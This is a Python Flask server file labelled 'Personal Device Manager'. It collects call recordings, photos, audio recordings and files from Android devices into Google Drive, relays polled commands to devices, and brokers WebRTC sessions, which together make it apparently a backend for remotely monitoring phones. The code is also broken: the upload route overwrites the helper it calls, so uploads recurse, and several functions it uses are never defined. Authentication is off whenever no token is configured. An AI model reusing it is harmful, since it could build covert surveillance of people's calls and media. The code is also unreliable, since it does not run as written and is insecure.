#!/usr/bin/env python3
"""
Personal Device Manager - Cloud-Hosted Server (server_git)
Runs on Railway/PaaS with Google Drive storage for file persistence.
Files are uploaded to Google Drive immediately on receive.
Dashboard reads files directly from Drive URLs.
"""

import os, json, uuid, shutil, subprocess, threading, time, signal, tempfile
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from werkzeug.utils import secure_filename

# Google Drive
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload, MediaIoBaseDownload

app = Flask(__name__)
CORS(app)

# === CONFIG ===
DRIVE_FOLDER_ID = os.environ.get('DRIVE_FOLDER_ID', '')
CREDENTIALS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'credentials.json')
TOKEN_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'token.json')
SCOPES = ['https://www.googleapis.com/auth/drive.file']
TEMP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'temp')
os.makedirs(TEMP_DIR, exist_ok=True)
METADATA_FILE = os.path.join(TEMP_DIR, 'metadata.json')
AUTH_TOKEN = os.environ.get('AUTH_TOKEN', None)
webrtc_connections = {}
drive_service = None

# Drive folder IDs (created on first use)
_drive_folders = {}

def get_drive():
    global drive_service
    if drive_service is not None:
        return drive_service
    creds = None
    if os.path.exists(TOKEN_FILE):
        try:
            creds = Credentials.from_authorized_user_file(TOKEN_FILE, SCOPES)
        except Exception:
            creds = None
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            try:
                creds.refresh(Request())
            except Exception:
                creds = None
        else:
            if not os.path.exists(CREDENTIALS_FILE):
                raise FileNotFoundError("credentials.json missing. See README.")
            flow = InstalledAppFlow.from_client_secrets_file(CREDENTIALS_FILE, SCOPES)
            creds = flow.run_local_server(port=5001, open_browser=True)
        with open(TOKEN_FILE, 'w') as f:
            f.write(creds.to_json())
    drive_service = build('drive', 'v3', credentials=creds)
    return drive_service

def get_folder(name):
    if name in _drive_folders:
        return _drive_folders[name]
    svc = get_drive()
    q = f"name='{name}' and mimeType='application/vnd.google-apps.folder' and trashed=false"
    res = svc.files().list(q=q, spaces='drive', fields='files(id,name)').execute()
    files = res.get('files', [])
    if files:
        _drive_folders[name] = files[0]['id']
        return files[0]['id']
    meta = {'name': name, 'mimeType': 'application/vnd.google-apps.folder'}
    if DRIVE_FOLDER_ID:
        meta['parents'] = [DRIVE_FOLDER_ID]
    f = svc.files().create(body=meta, fields='id').execute()
    _drive_folders[name] = f['id']
    return f['id']

def upload_file(path, ftype):
    folder_id = get_folder('DeviceManager')
    sub = {'callRecordings': 'CallRecordings', 'photos': 'Photos',
            'recordings': 'Recordings', 'files': 'Files'}.get(ftype, 'Files')
    sub_id = get_folder(sub)
    mime_map = {'jpg': 'image/jpeg', 'jpeg': 'image/jpeg', 'png': 'image/png',
                'm4a': 'audio/mp4a-latm', 'mp3': 'audio/mpeg',
                'mp4': 'video/mp4', 'pdf': 'application/pdf'}
    ext = os.path.splitext(path)[1].lstrip('.').lower()
    mime = mime_map.get(ext, 'application/octet-stream')
    info = upload_to_drive(path, sub_id, mime)
    meta = load_metadata()
    if device_id_global not in meta:
        meta[device_id_global] = {}
    if ftype not in meta[device_id_global]:
        meta[device_id_global][ftype] = []
    meta[device_id_global][ftype].append({
        'driveId': info['id'], 'driveUrl': info['downloadUrl'],
        'webViewUrl': info['webViewUrl'], 'name': info['name'],
        'size': info['size'], 'timestamp': int(time.time()*1000)
    })
    save_metadata(meta)
    return info

def load_meta():
    if os.path.exists(METADATA_FILE):
        try:
            with open(METADATA_FILE) as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_meta(m):
    with open(METADATA_FILE, 'w') as f:
        json.dump(m, f)

def add_meta(did, ft, info):
    m = load_meta()
    if did not in m:
        m[did] = {}
    if ft not in m[did]:
        m[did][ft] = []
    m[did][ft].append({'driveId': info['id'], 'driveUrl': info['downloadUrl'],
                        'webViewUrl': info['webViewUrl'], 'name': info['name'],
                        'size': info['size'], 'timestamp': int(time.time()*1000)})
    save_meta(m)
    return m[did][ft][-1]

def get_recs(did, ft=None):
    m = load_meta()
    if did not in m:
        return []
    if ft:
        return m[did].get(ft, [])
    r = []
    for t, fs in m[did].items():
        for f in fs:
            f['type'] = t
            r.append(f)
    return r

# Global for upload_file
device_id_global = None

def check_auth():
    if AUTH_TOKEN is None:
        return True
    t = request.headers.get('X-Auth-Token') or request.args.get('token')
    if not t:
        h = request.headers.get('Authorization', '')
        if h.startswith('Bearer '):
            t = h[7:].strip()
    return t == AUTH_TOKEN

def require_auth(f):
    from functools import wraps
    @wraps(f)
    def dec(*a, **kw):
        if not check_auth():
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*a, **kw)
    return dec

# === ROUTES ===

@app.route('/')
@app.route('/panel')
def serve_panel():
    web_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'web')
    if os.path.exists(web_dir):
        return send_from_directory(web_dir, 'panel.html')
    return jsonify({'error': 'Web panel not found'}), 404

@app.route('/api/server-url')
def server_url():
    return jsonify({'url': f'https://{request.host}', 'host': request.host})

@app.route('/oauth2callback')
def oauth_cb():
    return jsonify({'status': 'ok', 'message': 'OAuth done.'})

# WebRTC
@app.route('/api/webrtc/offer', methods=['POST'])
@require_auth
def wr_offer():
    d = request.get_json(silent=True) or {}
    did = d.get('deviceId', 'default')
    webrtc_connections[did] = webrtc_connections.get(did, {})
    webrtc_connections[did]['offer'] = d.get('offer')
    webrtc_connections[did]['timestamp'] = time.time()
    return jsonify({'status': 'ok'})

@app.route('/api/webrtc/answer', methods=['POST'])
@require_auth
def wr_answer():
    d = request.get_json(silent=True) or {}
    did = d.get('deviceId', 'default')
    webrtc_connections[did] = webrtc_connections.get(did, {})
    webrtc_connections[did]['answer'] = d.get('answer')
    webrtc_connections[did]['timestamp'] = time.time()
    return jsonify({'status': 'ok'})

@app.route('/api/webrtc/ice', methods=['POST'])
@require_auth
def wr_ice():
    d = request.get_json(silent=True) or {}
    did = d.get('deviceId', 'default')
    webrtc_connections[did] = webrtc_connections.get(did, {'ice': {'web': [], 'android': []}})
    if 'ice' not in webrtc_connections[did]:
        webrtc_connections[did]['ice'] = {'web': [], 'android': []}
    s = d.get('sender', 'web')
    webrtc_connections[did]['ice'][s if s in ('web','android') else 'web'].append(d.get('candidate'))
    return jsonify({'status': 'ok'})

@app.route('/api/webrtc/get-signaling', methods=['GET'])
@require_auth
def wr_get():
    did = request.args.get('deviceId', 'default')
    webrtc_connections[did] = webrtc_connections.get(did, {'offer': None, 'answer': None, 'ice': {'web': [], 'android': []}})
    return jsonify(webrtc_connections[did])

@app.route('/api/webrtc/clear', methods=['POST'])
@require_auth
def wr_clear():
    did = (request.get_json(silent=True) or {}).get('deviceId', 'default')
    webrtc_connections.pop(did, None)
    return jsonify({'status': 'ok'})

# Device management
@app.route('/api/devices', methods=['GET'])
@require_auth
def list_devices():
    m = load_meta()
    return jsonify([{'deviceId': did, 'info': {}} for did in m.keys()])

@app.route('/api/devices/<device_id>/status', methods=['GET'])
@require_auth
def dev_status(device_id):
    m = load_meta()
    r = m.get(device_id, {})
    return jsonify({
        'deviceId': device_id, 'lastSeen': int(time.time()*1000),
        'network': {'type': 'unknown', 'ipAddress': ''},
        'battery': {'level': -1, 'isCharging': False},
        'info': {},
        'files': {
            'callRecordings': len(r.get('callRecordings',[])),
            'photos': len(r.get('photos',[])),
            'recordings': len(r.get('recordings',[])),
            'files': len(r.get('files',[]))
        }
    })

@app.route('/api/devices/<device_id>/info', methods=['GET'])
@require_auth
def dev_info(device_id):
    return jsonify({'error': 'Not found'}), 404

# Command relay
@app.route('/api/commands', methods=['POST'])
@require_auth
def create_command():
    data = request.get_json()
    if not data or 'id' not in data:
        return jsonify({'error': 'Missing command ID'}), 400
    cid = data['id']
    did = data.get('deviceId', 'default')
    p = os.path.join(TEMP_DIR, f'{did}_{cid}.json')
    with open(p, 'w') as f:
        json.dump(data, f)
    return jsonify({'status': 'ok', 'commandId': cid})

@app.route('/api/commands/<device_id>/<command_id>', methods=['GET'])
@require_auth
def get_command(device_id, command_id):
    p = os.path.join(TEMP_DIR, f'{device_id}_{command_id}.json')
    if os.path.exists(p):
        with open(p) as f:
            return jsonify(json.load(f))
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/commands/<device_id>/<command_id>', methods=['DELETE'])
@require_auth
def del_command(device_id, command_id):
    p = os.path.join(TEMP_DIR, f'{device_id}_{command_id}.json')
    if os.path.exists(p):
        os.remove(p)
        return jsonify({'status': 'ok'})
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/commands/poll/<device_id>', methods=['GET'])
@require_auth
def poll_commands(device_id):
    cmds = []
    pre = f'{device_id}_'
    for fn in os.listdir(TEMP_DIR):
        if fn.startswith(pre) and fn.endswith('.json'):
            p = os.path.join(TEMP_DIR, fn)
            try:
                with open(p) as f:
                    c = json.load(f)
                    c['_file'] = fn
                    c['_commandId'] = fn[len(pre):-5]
                    cmds.append(c)
            except Exception:
                pass
    return jsonify(cmds)

# Response relay
@app.route('/api/responses', methods=['POST'])
@require_auth
def create_response():
    data = request.get_json()
    if not data or 'id' not in data:
        return jsonify({'error': 'Missing response ID'}), 400
    rid = data['id']
    did = data.get('deviceId', 'default')
    p = os.path.join(TEMP_DIR, f'{did}_{rid}.json')
    with open(p, 'w') as f:
        json.dump(data, f)
    return jsonify({'status': 'ok', 'responseId': rid})

@app.route('/api/responses/<device_id>/<response_id>', methods=['GET'])
@require_auth
def get_response(device_id, response_id):
    p = os.path.join(TEMP_DIR, f'{device_id}_{response_id}.json')
    if os.path.exists(p):
        with open(p) as f:
            return jsonify(json.load(f))
    return jsonify({'status': 'pending'})

@app.route('/api/responses/<device_id>/<response_id>', methods=['DELETE'])
@require_auth
def del_response(device_id, response_id):
    p = os.path.join(TEMP_DIR, f'{device_id}_{response_id}.json')
    if os.path.exists(p):
        os.remove(p)
        return jsonify({'status': 'ok'})
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/responses/poll/<device_id>', methods=['GET'])
@require_auth
def poll_responses(device_id):
    resps = []
    pre = f'{device_id}_'
    for fn in os.listdir(TEMP_DIR):
        if fn.startswith(pre) and fn.endswith('.json'):
            p = os.path.join(TEMP_DIR, fn)
            try:
                with open(p) as f:
                    r = json.load(f)
                    r['_responseId'] = fn[len(pre):-5]
                    resps.append(r)
            except Exception:
                pass
    return jsonify(resps)

# File upload with Drive
@app.route('/api/files/upload', methods=['POST'])
@require_auth
def upload_file():
    global device_id_global
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    device_id_global = request.form.get('deviceId', 'default')
    fn = secure_filename(file.filename)
    tmp = os.path.join(TEMP_DIR, fn)
    file.save(tmp)
    info = upload_file(tmp, 'files')
    os.remove(tmp)
    return jsonify({'status': 'ok', 'fileName': fn, 'fileSize': info['size'],
                    'downloadUrl': info['downloadUrl'], 'photoUrl': info['webViewUrl'],
                    'storage': 'drive', 'driveId': info['id']})

@app.route('/api/photos/upload', methods=['POST'])
@require_auth
def upload_photo():
    global device_id_global
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    device_id_global = request.form.get('deviceId', 'default')
    fn = secure_filename(file.filename)
    tmp = os.path.join(TEMP_DIR, fn)
    file.save(tmp)
    info = upload_file(tmp, 'photos')
    os.remove(tmp)
    return jsonify({'status': 'ok', 'fileName': fn, 'fileSize': info['size'],
                    'photoUrl': info['webViewUrl'], 'downloadUrl': info['downloadUrl'],
                    'storage': 'drive', 'driveId': info['id']})

@app.route('/api/recordings/upload', methods=['POST'])
@require_auth
def upload_recording():
    global device_id_global
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    device_id_global = request.form.get('deviceId', 'default')
    fn = secure_filename(file.filename)
    tmp = os.path.join(TEMP_DIR, fn)
    file.save(tmp)
    info = upload_file(tmp, 'recordings')
    os.remove(tmp)
    return jsonify({'status': 'ok', 'fileName': fn, 'fileSize': info['size'],
                    'url': info['downloadUrl'], 'webUrl': info['webViewUrl'],
                    'storage': 'drive', 'driveId': info['id']})

@app.route('/api/call-recording/<device_id>', methods=['POST'])
@require_auth
def upload_call_recording(device_id):
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    fn = secure_filename(file.filename)
    tmp = os.path.join(TEMP_DIR, fn)
    file.save(tmp)
    info = upload_file(tmp, 'callRecordings')
    os.remove(tmp)
    return jsonify({'status': 'ok', 'fileName': fn, 'fileSize': info['size'],
                    'url': info['downloadUrl'], 'webUrl': info['webViewUrl'],
                    'storage': 'drive', 'driveId': info['id']})

# Drive file listing
@app.route('/api/drive/records/<device_id>', methods=['GET'])
@require_auth
def drive_records(device_id):
    recs = get_recs(device_id)
    return jsonify(recs)

@app.route('/api/drive/file/<file_id>', methods=['GET'])
@require_auth
def drive_file(file_id):
    svc = get_drive()
    f = svc.files().get(fileId=file_id, fields='id,name,size,webViewLink,mimeType').execute()
    return jsonify({
        'id': f['id'], 'name': f['name'], 'size': f.get('size', 0),
        'downloadUrl': f'https://drive.google.com/uc?id={f["id"]}',
        'webViewUrl': f.get('webViewLink', ''),
        'mimeType': f.get('mimeType', 'application/octet-stream')
    })

@app.route('/api/drive/file/<file_id>/download', methods=['GET'])
@require_auth
def drive_file_download(file_id):
    tmp = os.path.join(TEMP_DIR, f'dl_{file_id}')
    download_from_drive(file_id, tmp)
    from flask import send_file
    return send_file(tmp, as_attachment=True, download_name='file')
    # Note: in production, stream directly or use Drive's download URL

def download_from_drive(file_id, dest):
    svc = get_drive()
    req = svc.files().get_media(fileId=file_id)
    with open(dest, 'wb') as f:
        downloader = MediaIoBaseDownload(f, req)
        done = False
        while not done:
            _, done = downloader.next_chunk()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"Starting server on port {port}...")
    print("On first run, a browser will open for Google OAuth.")
    print("After auth, token.json is saved for future runs.")
    app.run(host='0.0.0.0', port=port, threaded=True)